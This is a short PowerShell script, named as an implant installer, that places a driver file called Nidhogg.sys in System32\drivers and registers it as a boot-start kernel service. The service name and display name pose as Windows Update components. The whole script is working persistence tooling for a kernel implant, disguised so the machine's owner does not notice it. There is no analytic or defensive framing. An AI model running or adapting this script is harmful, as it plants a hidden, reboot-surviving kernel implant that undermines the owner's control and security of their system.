# Install_Implant_PreBoot.ps1
$AppDir = "C:\Windows\System32\WindowsModulesAssistant"
$DriverPath = "C:\Windows\System32\drivers\Nidhogg.sys"
$ServiceName = "WindowsUpdateSvc"

Write-Host "[+] Starting Driver Installation..." -ForegroundColor Cyan

# 1. Move the driver into the official drivers subfolder
if (Test-Path "$AppDir\Nidhogg.sys") {
    Move-Item "$AppDir\Nidhogg.sys" -Destination $DriverPath -Force
    Write-Host "[+] Driver moved to System32\drivers" -ForegroundColor Green
} elseif (-not (Test-Path $DriverPath)) {
    Write-Host "[-] Nidhogg.sys not found in $AppDir! Service creation will fail." -ForegroundColor Red
}

# 2. Clean up any old/broken service first
if (Get-Service $ServiceName -ErrorAction SilentlyContinue) {
    Write-Host "[+] Stopping and deleting old service..." -ForegroundColor Yellow
    sc.exe stop $ServiceName > $null 2>&1
    sc.exe delete $ServiceName > $null 2>&1
    Start-Sleep -Seconds 3
}

# 3. Create the service as a true boot-start kernel driver
Write-Host "[+] Creating kernel driver service (boot start)..." -ForegroundColor Cyan
sc.exe create $ServiceName type= kernel start= boot binPath= "$DriverPath" DisplayName= "Windows Update Health Monitor" > $null 2>&1

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Service created successfully" -ForegroundColor Green
} else {
    Write-Host "[-] Service creation failed" -ForegroundColor Red
}

# 4. Start it immediately for testing
sc.exe start $ServiceName > $null 2>&1
Write-Host "[+] Driver service started" -ForegroundColor Green